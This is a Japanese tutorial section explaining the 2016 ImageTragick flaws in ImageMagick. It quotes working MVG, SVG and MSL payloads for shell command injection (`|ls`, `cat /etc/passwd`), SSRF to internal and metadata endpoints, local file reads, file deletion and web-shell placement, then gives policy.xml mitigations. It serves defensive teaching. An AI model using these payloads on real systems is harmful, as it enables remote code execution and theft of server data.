## ImageTragickのPoC・Exploit

「ImageTragick」は、2016年5月に公開された画像処理ライブラリ **ImageMagick** の一連の脆弱性群（総称）の通称です。ファイルアップロード機能を持つWebアプリの多くが、サムネイル生成やリサイズのために内部で ImageMagick を呼び出しており、しかもその処理は「ユーザーがアップロードした画像ファイル」を直接 ImageMagick に食わせる形になっているため、**アップロードした画像を「開かせる」だけでサーバ上で任意コマンドが走る（RCE）** という、極めて影響の大きい問題でした。本節では、公開された PoC / Exploit の実物を引用しながら、「なぜ画像を1枚アップロードするだけでコマンドが実行できてしまうのか」を仕組みのレベルで解剖します。

> 本節はすべて防御目的の解説です。ここで示すペイロードは、自分が管理する隔離環境（脆弱な古いバージョンを意図的に立てた検証用コンテナなど）でのみ動作を確認してください。実在サービスや本番環境への無許可の検証は行わないでください。

### そもそもの前提：ImageMagick の「delegate（デリゲート）」機構

ImageMagick は単体ではすべての画像・ドキュメント形式を扱えません。PDF・SVG・HTTPS 越しの画像取得などは、**外部プログラムに処理を委譲（delegate）** することで実現しています。この委譲の設定は `delegates.xml`（環境により `delegate.xml`）というファイルに、コマンドテンプレートとして書かれています。ここが攻撃の起点です。

問題の核心は、この委譲コマンドが最終的に **`system()`（OSのシェルにコマンド文字列を丸ごと渡して実行する関数）で実行される** ことです。`system()` に渡る文字列がシェルによって解釈されるため、そこに `|`（パイプ）、`;`（コマンド区切り）、`` ` ``（コマンド置換）といった **シェルのメタ文字** が混入すると、テンプレート作成者が意図しなかったコマンドが追加で実行されてしまいます。

代表例が HTTPS 取得用のデリゲートです。当時のデフォルト定義は概ね次の形でした。

```
"wget" -q -O "%o" "https:%M"
```

- `%o` は出力ファイル名に、`%M` は「取得対象のURL（の一部）」に、それぞれ ImageMagick が置換します。
- ここで `%M` の中身は、**画像ファイルの中に書かれた URL 文字列がそのまま入ってきます**。つまり攻撃者が完全に制御できる部分です。
- `%M` に対するエスケープ（シェルのメタ文字を無害化する処理）が不十分でした。結果として、URL の中に `"` で二重引用符を閉じ、`|` でパイプをつなげば、`wget` の後ろに任意コマンドを継ぎ足せてしまいます。

これが最重要の CVE、**CVE-2016-3714（デリゲート経由の任意コマンド実行）** の原理です。

### 5つのCVE：ImageTragickの全体像

ImageTragick は単一のバグではなく、ImageMagick 7.0.1-0 / 6.9.3-9 以前に存在した複数の欠陥の集合です。Exploit-DB のエントリでは次の5件が整理されています。

| CVE | 内容 | 悪用に使う擬似プロトコル/仕組み |
| --- | --- | --- |
| CVE-2016-3714 | シェルインジェクションによる**リモートコード実行（RCE）** | `https:` デリゲート（`|` 注入） |
| CVE-2016-3715 | **任意ファイル削除** | `ephemeral:` 擬似プロトコル |
| CVE-2016-3716 | **任意ファイル移動/配置** | `msl:`（Magick Scripting Language） |
| CVE-2016-3717 | **ローカルファイル読み取り（情報漏えい）** | `label:@` 擬似プロトコル |
| CVE-2016-3718 | **SSRF（サーバサイドリクエストフォージェリ）** | `url:` / `https:` によるリクエスト送出 |

ここで鍵になる概念が **「擬似プロトコル（pseudo-protocol）」** です。ImageMagick はファイル名の先頭に `label:`、`msl:`、`ephemeral:`、`url:` のような「コーダ名（coder、＝特定形式を扱う処理モジュールの指定）」を付けると、その名前に応じた特殊処理を発動します。攻撃者はこれらを悪用して、画像処理とは無関係なファイル操作やネットワークアクセスを引き起こします。

> 出典: Exploit-DB「ImageMagick 7.0.1-0 / 6.9.3-9 - ImageTragick」 — https://www.exploit-db.com/exploits/39767

### 攻撃の入り口となるファイル形式：MVG と SVG と MSL

RCE を語る前に、「攻撃者が制御する URL 文字列を、どうやって ImageMagick に食わせるか」を押さえます。使われるのは主に次の3つです。

- **MVG（Magick Vector Graphics）**: ImageMagick 独自のベクター記述言語。テキストで描画命令を書ける。`fill 'url(...)'` のように外部リソースを参照する構文があり、この URL 部分に攻撃文字列を入れる。
- **SVG**: 標準的なベクター画像形式。`<image xlink:href="...">` で外部画像を参照でき、この href に攻撃文字列を入れる。
- **MSL（Magick Scripting Language）**: XMLベースのスクリプト。`<read>`／`<write>` で任意ファイルの読み書きを指示できる（ファイル移動の悪用に使う）。

#### 拡張子チェックはなぜ回避されるのか

多くのアプリは「拡張子が `.jpg` か `.png` か」を検査してアップロードを許可します。しかし ImageMagick は **ファイルの中身（マジックバイトや構造）から形式を推測（content sniffing）** します。したがって、中身は MVG や SVG のペイロードなのに、ファイル名だけ `exploit.png` にしておけば、拡張子チェックを通過したうえで ImageMagick が「これは MVG だ」と正しく（＝攻撃者に都合よく）判定して処理してしまいます。これが「拡張子検査だけでは防げない」根本理由です。

さらに、`convert` だけでなく **`identify`（画像のメタ情報を表示するだけに見えるコマンド）も同じデリゲート機構を通る**ため、攻撃対象になります。「表示するだけだから安全」という思い込みが通用しません。

### PoC 1：リモートコード実行（CVE-2016-3714）

最も直接的なのは、`convert` にコマンドライン引数として渡す形です。

```
convert 'https://example.com"|ls "-la' out.png
```

**なぜ動くのか**: `https:` を見て ImageMagick は HTTPS デリゲート `"wget" -q -O "%o" "https:%M"` を発動します。`%M` に `example.com"|ls "-la` が入ると、生成されるシェルコマンドは概念的に次のようになります。

```
"wget" -q -O "out.png" "https:example.com"|ls "-la"
```

`"` で URL 用の引用符が途中で閉じられ、`|`（パイプ）で `wget` の出力が `ls -la` に渡される形になります。シェルはこれを「wget を実行し、その後 `ls -la` も実行する」と解釈します。`ls` の部分を任意コマンド（リバースシェル取得など）に置き換えれば RCE が成立します。

実際のアップロード攻撃では、コマンドライン引数ではなく **ファイルの中身** として渡します。MVG 形式のペイロードは次の通りです。

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

SVG 形式なら次のようになります。

```xml
<?xml version="1.0" standalone="no"?>
<svg width="640px" height="480px" version="1.1">
<image xlink:href="https://example.com/image.jpg"|ls "-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

**なぜ動くのか**: どちらも「外部画像を URL で読み込む」という正当な機能を悪用しています。ImageMagick はこの URL を取得するために HTTPS デリゲートを呼び、`%M` に `image.jpg"|ls "-la` が入ることで、上のコマンドライン版とまったく同じシェルインジェクションが起きます。攻撃者は正規の画像に見せかけたこのファイルをアップロードするだけでよく、サーバ側のリサイズ処理（`convert` 呼び出し）が引き金を引きます。

VoidSec の記事では、`||`（前のコマンドが失敗したら次を実行）を使い、実行結果を確認しやすくした変種も示されています。

```
"viewbox 0 0 1 1 image over 0,0 0,0 'https://voidsec.com/" || cat /etc/passwd && echo "0'"
```

これを `convert imagetragick.mvg out.png` のように処理させると、外部取得に失敗した後 `cat /etc/passwd` が走ります。前述の通り `identify imagetragick.mvg` でも同様に発火するため、`convert` を使っていないアプリでも油断できません。

> 出典: VoidSec「ImageTragick PoC」 — https://voidsec.com/imagetragick-poc/

> ⚠️ **未取得の資料についての注記**: 本節で参照した2資料は取得できました。上記の VoidSec 記事は「ImageTragick GitHub リポジトリに追加のPoCがある」と述べつつ、delegate.xml の内部機構の詳細までは踏み込んでいません。その空白は、以下の Exploit-DB 側の記述と一般的な公開知識で補っています。

### PoC 2：SSRF（CVE-2016-3718）

RCE まで至らなくても、ImageMagick に「任意の URL へリクエストを送らせる」ことができます。これが SSRF です。

```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://target.internal/)'
pop graphic-context
```

**なぜ動くのか**: `url(...)` に指定したアドレスへ、ImageMagick が（画像取得のつもりで）HTTP/FTP リクエストを送出します。攻撃者は `http://169.254.169.254/`（クラウドのメタデータエンドポイント）や `http://内部ホスト/` を指定し、外部からは直接触れない内部ネットワークへサーバを踏み台にしてアクセスさせられます。RCE 用のシェルメタ文字を含まない「普通の URL」でも成立する点が SSRF の特徴で、たとえコマンドインジェクション側が緩和されていても、URL コーダが有効なままだと SSRF は残り得ます。

### PoC 3：ローカルファイル読み取り（CVE-2016-3717）

`label:` は本来「テキストを画像化する」コーダですが、`label:@ファイルパス` と書くと **そのファイルの中身を読み込んでラベル画像として描画** します。これを使うとサーバ上のファイルを盗み見できます。

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

**なぜ動くのか**: `@` はファイル内容の読み込みを意味する記法です。`label:@/etc/passwd` で `/etc/passwd` の中身がラベルテキストとして生成画像に焼き込まれ、その出力画像（サムネイル）が攻撃者に返される経路があれば、内容が漏えいします。設定ファイルや秘密鍵など、Webプロセスが読める任意のパスが標的になります。

### PoC 4：任意ファイル削除（CVE-2016-3715）

`ephemeral:` は「一度読み込んだら削除する（一時的）」という意味の擬似プロトコルです。これを悪用すると任意ファイルを消せます。

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/target.txt'
pop graphic-context
```

**なぜ動くのか**: `ephemeral:` コーダは対象ファイルを読み込んだ後に `unlink()`（削除）します。本来はテンポラリ画像の後始末用ですが、パスに攻撃者が任意のファイルを指定できるため、削除プリミティブになります。

### PoC 5：任意ファイル移動/配置（CVE-2016-3716）→ Webシェル設置

最も RCE に直結しやすいのが、MSL を使ったファイル移動です。二段構えになっています。

まず、MSL スクリプトを呼び出すトリガとなる MVG（`file_move.mvg`）:

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
pop graphic-context
```

次に、その `/tmp/msl.txt`（MSL の中身）:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>
```

**なぜ動くのか**: `msl:` コーダは指定した MSL ファイルを **スクリプトとして解釈** します。MSL の `<read>` であるファイルを読み、`<write>` で別のパスへ書き出せます。上の例は「`/tmp/image.gif` を読んで、Web公開ディレクトリ `/var/www/shell.php` に書き込む」という指示です。もし `image.gif` の中身が PHP コードを含む画像であれば、実質的に **Webシェルを公開ディレクトリに設置** でき、以後はブラウザからそのPHPを叩いてコマンド実行できます。ファイル読み取り（CVE-2016-3717）で書き込み先の存在や権限を確認しつつ、この移動プリミティブで足場を作る、という連鎖が典型でした。

なお、二段構えにするのは、攻撃者が MSL 本体（`/tmp/msl.txt` や `image.gif`）を事前にサーバへ置ける前提のときに有効です。実戦では、アップロード先の一時ディレクトリのパスを推測・利用してこれらを配置します。

### 影響範囲：どんなアプリが刺さったか

VoidSec は、ImageMagick を内部で呼ぶ各言語のラッパーが軒並み影響を受けたと指摘しています。

- **PHP**: `imagick` 拡張
- **Ruby**: `rmagick`、`paperclip`
- **Node.js**: `imagemagick` モジュール

これらを使って「アップロード画像のサムネイル生成・リサイズ」を行っている一般的な構成が、そのまま攻撃面になりました。加えて、ImageMagick が PDF や PS を扱うために **Ghostscript** を、URL 取得のために **wget/curl** を呼ぶため、これらが入っている環境ほど悪用が容易でした（逆に言えば、これらのデリゲートを無効化すれば攻撃面は狭まります）。

> 出典: VoidSec「ImageTragick PoC」 — https://voidsec.com/imagetragick-poc/

### 防御：何を、なぜ止めるのか

Exploit-DB が示す最重要の緩和策は、**`policy.xml`（ImageMagick のセキュリティポリシー設定）で危険なコーダ/デリゲートを無効化する** ことです。

```xml
<policymap>
    <policy domain="coder" rights="none" pattern="EPHEMERAL" />
    <policy domain="coder" rights="none" pattern="URL" />
    <policy domain="coder" rights="none" pattern="HTTPS" />
    <policy domain="coder" rights="none" pattern="MVG" />
    <policy domain="coder" rights="none" pattern="MSL" />
</policymap>
```

**なぜ効くのか**: `rights="none"` は「そのコーダの利用を一切許可しない」という宣言です。攻撃の起点である各擬似プロトコル/コーダ（`HTTPS`・`URL`→RCE/SSRF、`EPHEMERAL`→削除、`MVG`/`MSL`→スクリプト実行・ファイル移動）を根本から塞ぐことで、たとえ悪意ある画像が処理に回っても、危険な副作用が発火しなくなります。攻撃者制御の入力を無害化する「エスケープ」ではなく、**機能そのものを無効化する**アプローチである点が重要です（エスケープ漏れを追いかけるより堅牢）。

補助的な防御として、Exploit-DB / VoidSec は次も挙げています。

- **マジックバイト検証**: 処理前にファイル先頭の「マジックバイト」を確認し、期待する画像形式のヘッダと一致するかを検査する。中身が MVG/SVG のファイルを弾ける。
- **ヘッダとの整合チェック**: 拡張子・Content-Type・実際のヘッダが矛盾しないか検証する（拡張子偽装対策）。
- **デリゲート機能の制限**: ポリシーでデリゲートの権限を絞る。
- **パッチ適用**: 修正済みバージョンへの更新。

> 出典: Exploit-DB「ImageMagick 7.0.1-0 / 6.9.3-9 - ImageTragick」 — https://www.exploit-db.com/exploits/39767

#### バージョンと時事性についての注記

- 対象は **ImageMagick 7.0.1-0 / 6.9.3-9 以前**（2016年5月時点）。同月以降、`%M` のエスケープ強化やデフォルト `policy.xml` の厳格化を含む修正版が順次リリースされました。
- 現在（本書執筆時点）の新しいディストリビューションでは、既定の `policy.xml` で `HTTPS`・`URL`・`MVG`・`MSL`・`PS`・`EPHEMERAL` などが最初から無効化されていることが多いです。ただし **古いイメージを使い続けているコンテナ・レガシー環境・独自ビルドでは既定ポリシーが緩いことがある**ため、「今どきは平気」と決めつけず、実際に稼働している ImageMagick のバージョンと `policy.xml` の内容を確認することが実務上の要点です。
- なお、ImageTragick はデリゲート起点の RCE の「原型」であり、その後も ImageMagick には別系統の脆弱性（後年の CVE 群）が繰り返し見つかっています。「ImageTragick は塞いだ」ことと「ImageMagick が安全」であることは別物である点に注意してください。

### まとめ：この節の核心

1. **アップロード画像 → ImageMagick → デリゲート → `system()`** という経路で、画像の中身に仕込んだ URL 文字列がシェルコマンドに化ける。これが CVE-2016-3714（RCE）の本質。
2. RCE 以外にも、擬似プロトコル（`label:@`／`ephemeral:`／`msl:`／`url:`）を使えばファイル読み取り・削除・移動・SSRF が可能で、特に MSL によるファイル移動は **Webシェル設置** に直結する。
3. **拡張子検査は content sniffing で回避される**。`identify` も安全ではない。
4. 最も堅い防御は、エスケープではなく **`policy.xml` で危険なコーダ/デリゲートを機能ごと無効化** すること。加えてマジックバイト検証・パッチ適用・稼働バージョンとポリシーの実地確認を行う。
